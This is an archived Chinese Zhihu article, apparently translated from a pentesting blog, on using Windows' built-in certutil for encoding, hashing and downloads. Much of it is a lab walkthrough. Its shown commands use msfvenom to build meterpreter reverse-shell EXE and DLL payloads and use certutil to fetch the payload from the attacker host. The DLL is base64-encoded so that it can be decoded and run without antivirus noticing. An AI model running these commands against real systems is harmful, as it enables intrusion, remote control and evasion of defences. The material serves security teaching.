<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Windows上自带的渗透测试工具：Certutil</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/107819644">原文</a></p>
<div class="title-image"><img src="https://pic4.zhimg.com/v2-ad379e5e3c810e0176b4dbd852315d81_b.jpg" alt=""></div><p>Certutil 是 Windows 操作系统上预装的工具，可用于 校验文件MD5、SHA1、SHA256，下载恶意文件和免杀。</p><blockquote>本文仅供学习使用，请勿用于非法操作，后果与作者无关。</blockquote><p>下面，将介绍它在 Windows 渗透测试中的作用。</p><h2>Certutil</h2><p>Certutil 是一个 CLI 程序，可用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA 组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装。</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-bffeeb2e11925a2168d59b9bce2dc021_b.jpg" data-caption="" data-size="normal" data-rawwidth="858" data-rawheight="207" class="origin_image zh-lightbox-thumb" width="858" data-original="https://pic2.zhimg.com/v2-bffeeb2e11925a2168d59b9bce2dc021_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-bffeeb2e11925a2168d59b9bce2dc021_b.jpg" data-caption="" data-size="normal" data-rawwidth="858" data-rawheight="207" class="origin_image zh-lightbox-thumb lazy" width="858" data-original="https://pic2.zhimg.com/v2-bffeeb2e11925a2168d59b9bce2dc021_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-bffeeb2e11925a2168d59b9bce2dc021_b.jpg"/></figure><p><b>作为系统工具的它，为什么会成为一个攻击工具（后门）？</b></p><p><b>简单来说，就是 非恶意软件攻击，下面是具体的操作示例。</b></p><p><b>环境</b></p><ul><li>攻击者（kali 192.168.1.51）</li><li>靶机（Windows10 192.168.1.63）</li></ul><p><b>编码</b></p><p>Certutil 包含一个编码参数（编码）。这有助于在 Base64 中编码文件的内容。这是在 Windows 中等效于 Linux 中的 base64 命令。</p><p>不能打开 .exe 可执行文件时，可以使用 certutil 对可执行文件进行编码。然后传输编码后的数据，然后在接收机上对其进行解码。</p><p>首先创建一个名为 file.txt 的文本文件，输入一些内容，打开 PowerShell。</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-5e2ae50bf21ff7fc2f95f4084d41b6c1_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb" width="784" data-original="https://pic2.zhimg.com/v2-5e2ae50bf21ff7fc2f95f4084d41b6c1_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-5e2ae50bf21ff7fc2f95f4084d41b6c1_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb lazy" width="784" data-original="https://pic2.zhimg.com/v2-5e2ae50bf21ff7fc2f95f4084d41b6c1_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-5e2ae50bf21ff7fc2f95f4084d41b6c1_b.jpg"/></figure><blockquote>参数-encodehex 将数据转换为十六进制编码的文件。</blockquote><p><b>解码</b></p><p>Certutil 可以解码 Base64 编码的数据。使用 certutil 和参数 -decode。</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-88bf3e4cfbe59c8b80ec1efd1e28aac1_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb" width="784" data-original="https://pic2.zhimg.com/v2-88bf3e4cfbe59c8b80ec1efd1e28aac1_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-88bf3e4cfbe59c8b80ec1efd1e28aac1_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb lazy" width="784" data-original="https://pic2.zhimg.com/v2-88bf3e4cfbe59c8b80ec1efd1e28aac1_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-88bf3e4cfbe59c8b80ec1efd1e28aac1_b.jpg"/></figure><blockquote>参数 -decodehex 解码十六进制编码的文件。</blockquote><p><b>散列</b></p><p>获取数据并传递固定长度的输出字符串。使用哈希加密算法，例如 MD5，SHA-1，SHA-256，可以验证两个文件是否相同。该校验和是用于执行检查的散列值的数据完整性，这是一种文件签名。通过比较校验和，我们可以识别重复文件。</p><p>命令 certutil -hashfile 生成指定哈希值。</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-4749ebd1dc9eff155c0717a4bda28f66_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb" width="784" data-original="https://pic3.zhimg.com/v2-4749ebd1dc9eff155c0717a4bda28f66_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-4749ebd1dc9eff155c0717a4bda28f66_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb lazy" width="784" data-original="https://pic3.zhimg.com/v2-4749ebd1dc9eff155c0717a4bda28f66_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-4749ebd1dc9eff155c0717a4bda28f66_b.jpg"/></figure><blockquote>注意：哈希算法区分大小写，MD5。</blockquote><p><b>下载</b></p><p>certutil 还可用于从互联网下载文件。</p><div class="highlight"><pre><code class="language-text">certutil.exe -urlcache -split -f http://example.com/a.txt</code></pre></div><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-aef67dce4b66bfc28443d55b5a8ec6d4_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb" width="784" data-original="https://pic1.zhimg.com/v2-aef67dce4b66bfc28443d55b5a8ec6d4_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-aef67dce4b66bfc28443d55b5a8ec6d4_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb lazy" width="784" data-original="https://pic1.zhimg.com/v2-aef67dce4b66bfc28443d55b5a8ec6d4_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-aef67dce4b66bfc28443d55b5a8ec6d4_b.jpg"/></figure><p><b>系统错误代码</b></p><p>Certutil 可以帮助你找到系统错误代码的消息文本，查看系统错误代码的含义。</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-8dd4550df76bdf04408d16a72b4af8e9_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb" width="784" data-original="https://pic2.zhimg.com/v2-8dd4550df76bdf04408d16a72b4af8e9_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-8dd4550df76bdf04408d16a72b4af8e9_b.jpg" data-caption="" data-size="small" data-rawwidth="784" data-rawheight="467" class="origin_image zh-lightbox-thumb lazy" width="784" data-original="https://pic2.zhimg.com/v2-8dd4550df76bdf04408d16a72b4af8e9_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-8dd4550df76bdf04408d16a72b4af8e9_b.jpg"/></figure><h2>使用Certutil进行渗透测试</h2><p><b>提交恶意可执行文件</b></p><p>前面提到，Certutil 可在未经任何验证或评估的情况下主动从 Internet 下载文件。</p><p>Certutil 可用于将文件从一个系统复制到另一个系统，以在攻击过程中横向移动一些攻击工具或其他文件。</p><p>使用 <b>msfvenom </b>工具生成一个有效载荷或一个有效载荷，用于与攻击机器的反向 TCP 连接。有效负载的格式设置为可执行文件 .exe。执行成功后，将在 root 目录中创建文件。</p><p>使用由 Python One-liner 生成的 HTTP Server 传输可执行文件。</p><div class="highlight"><pre><code class="language-text">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.51 lport=1234 -f exe &gt; shell.exe
python -m SimpleHTTPServer 80</code></pre></div><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-7920a143e7035e85f810e085ab570229_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="608" class="origin_image zh-lightbox-thumb" width="834" data-original="https://pic2.zhimg.com/v2-7920a143e7035e85f810e085ab570229_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-7920a143e7035e85f810e085ab570229_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="608" class="origin_image zh-lightbox-thumb lazy" width="834" data-original="https://pic2.zhimg.com/v2-7920a143e7035e85f810e085ab570229_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-7920a143e7035e85f810e085ab570229_b.jpg"/></figure><p>有效负载已托管在服务器上，在靶机（受害者）上执行有效负载之前，我们需要在攻击计算机上启动监听，以捕获执行有效负载后生成的会话。</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-86eb16509ce4b63bac86d80646204742_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb" width="834" data-original="https://pic3.zhimg.com/v2-86eb16509ce4b63bac86d80646204742_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-86eb16509ce4b63bac86d80646204742_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb lazy" width="834" data-original="https://pic3.zhimg.com/v2-86eb16509ce4b63bac86d80646204742_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-86eb16509ce4b63bac86d80646204742_b.jpg"/></figure><p>成功启动攻击者的侦听器之后，进入靶机。在这里，我们有一个 PowerShell 终端。我们需要将有效负载下载到这台机器上。使用 certutil 来查找它。Certutil 将使用两个不同的用户代理建立到远程 Web 服务器的两个连接。</p><p>有效负载成功传输到靶机之后。如图所示，执行有效负载。</p><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-b37e126bc1a17f85212e345417929618_b.jpg" data-caption="" data-size="small" data-rawwidth="623" data-rawheight="332" class="origin_image zh-lightbox-thumb" width="623" data-original="https://pic1.zhimg.com/v2-b37e126bc1a17f85212e345417929618_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-b37e126bc1a17f85212e345417929618_b.jpg" data-caption="" data-size="small" data-rawwidth="623" data-rawheight="332" class="origin_image zh-lightbox-thumb lazy" width="623" data-original="https://pic1.zhimg.com/v2-b37e126bc1a17f85212e345417929618_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-b37e126bc1a17f85212e345417929618_b.jpg"/></figure><p>回到攻击机器，以查看我们的侦听器生成并捕获 meterpreter 的实例。运行 sysinfo 以查看目标系统的详细信息。</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-1aa46309a3f6bde55897364446718a55_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb" width="834" data-original="https://pic2.zhimg.com/v2-1aa46309a3f6bde55897364446718a55_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-1aa46309a3f6bde55897364446718a55_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb lazy" width="834" data-original="https://pic2.zhimg.com/v2-1aa46309a3f6bde55897364446718a55_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-1aa46309a3f6bde55897364446718a55_b.jpg"/></figure><p>成功使用了 Certutil 和恶意可执行文件来 Getshell。</p><p><b>提交恶意 DLL 编码</b></p><p>Certutil 可对文件进行进行base64 编码，攻击者可以使用经过混淆的文件来隐藏扫描攻击的证据。然后再解码这些文件。这就是 certutil 发挥作用的地方。可以解码数据并避免杀毒软件察觉。Certutil 还可以用于解码已隐藏在证书文件中的可移植可执行文件。</p><p><b>有效载荷可以被编码或加密，以避免被检测。</b></p><p>还是使用 msfvenom 工具为与攻击机器的反向TCP连接生成有效负载。有效负载的格式在动态链接库文件 .dll 中设置。命名为 dll.txt。成功执行后，将在 root 目录中创建文件。现在，要传输该文件，我们可以使用 Python One-liner 生成的 HTTP Server。</p><div class="highlight"><pre><code class="language-text">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.51 lport=1234 -f dll &gt; dll.txt
python -m SimpleHTTPServer 80</code></pre></div><p>有效负载已托管在服务器上，在靶机上执行有效负载之前，我们需要在攻击计算机上启动监听，以捕获在有效负载执行后将生成的会话。</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-1249881d9bdd45b8f9644d8fc976b162_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb" width="834" data-original="https://pic3.zhimg.com/v2-1249881d9bdd45b8f9644d8fc976b162_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-1249881d9bdd45b8f9644d8fc976b162_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb lazy" width="834" data-original="https://pic3.zhimg.com/v2-1249881d9bdd45b8f9644d8fc976b162_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-1249881d9bdd45b8f9644d8fc976b162_b.jpg"/></figure><p>成功启动攻击者的监听之后再进入靶机。打开 PowerShell 终端。我们需要将有效负载下载到这台机器上，并且必须谨慎进行。执行命令：</p><div class="highlight"><pre><code class="language-text">certutil -urlcache -split -f http://192.168.1.51/dll.txt dll.txt | certutil -encode dll.txt edll.txt</code></pre></div><blockquote>该文件将被下载为文本文件，并被编码为另一个文本文件。</blockquote><p>现在要执行有效载荷以损害受害者，我们必须对其进行解码。使用 -decode 参数解码有效负载并将其保存为 exploit.dll（杀毒软件不会察觉）。然后运行此 DLL。</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-7b59f6325404206e6d5565ba40f3b841_b.jpg" data-caption="" data-size="small" data-rawwidth="623" data-rawheight="332" class="origin_image zh-lightbox-thumb" width="623" data-original="https://pic2.zhimg.com/v2-7b59f6325404206e6d5565ba40f3b841_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-7b59f6325404206e6d5565ba40f3b841_b.jpg" data-caption="" data-size="small" data-rawwidth="623" data-rawheight="332" class="origin_image zh-lightbox-thumb lazy" width="623" data-original="https://pic2.zhimg.com/v2-7b59f6325404206e6d5565ba40f3b841_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-7b59f6325404206e6d5565ba40f3b841_b.jpg"/></figure><p>回到攻击机器，以查看我们的监听生成并捕获 meterpreter 的实例。运行 sysinfo 以查看目标系统的详细信息。</p><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-c64d3342cc6797ffb957d81dea01eb50_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb" width="834" data-original="https://pic1.zhimg.com/v2-c64d3342cc6797ffb957d81dea01eb50_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-c64d3342cc6797ffb957d81dea01eb50_b.jpg" data-caption="" data-size="small" data-rawwidth="834" data-rawheight="642" class="origin_image zh-lightbox-thumb lazy" width="834" data-original="https://pic1.zhimg.com/v2-c64d3342cc6797ffb957d81dea01eb50_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-c64d3342cc6797ffb957d81dea01eb50_b.jpg"/></figure><p>成功使用 Certutil 和恶意编码的可执行文件 Getshell。</p><blockquote>来源：<a href="https://link.zhihu.com/?target=https%3A//esgeeks.com/%3Fp%3D7766" class=" wrap external" target="_blank" rel="nofollow noreferrer">Hacking Windows para Pentester: Certutil</a></blockquote><p>今天的内容就简单介绍到这里了。更多有关内容请前往 <a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a> 进行学习，最近推出了一系列网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-8ed324d8425c9ee5b45135bfdaa4b0ed_b.jpg" data-caption="" data-size="normal" data-rawwidth="1397" data-rawheight="438" class="origin_image zh-lightbox-thumb" width="1397" data-original="https://pic2.zhimg.com/v2-8ed324d8425c9ee5b45135bfdaa4b0ed_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-8ed324d8425c9ee5b45135bfdaa4b0ed_b.jpg" data-caption="" data-size="normal" data-rawwidth="1397" data-rawheight="438" class="origin_image zh-lightbox-thumb lazy" width="1397" data-original="https://pic2.zhimg.com/v2-8ed324d8425c9ee5b45135bfdaa4b0ed_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-8ed324d8425c9ee5b45135bfdaa4b0ed_b.jpg"/></figure><p></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
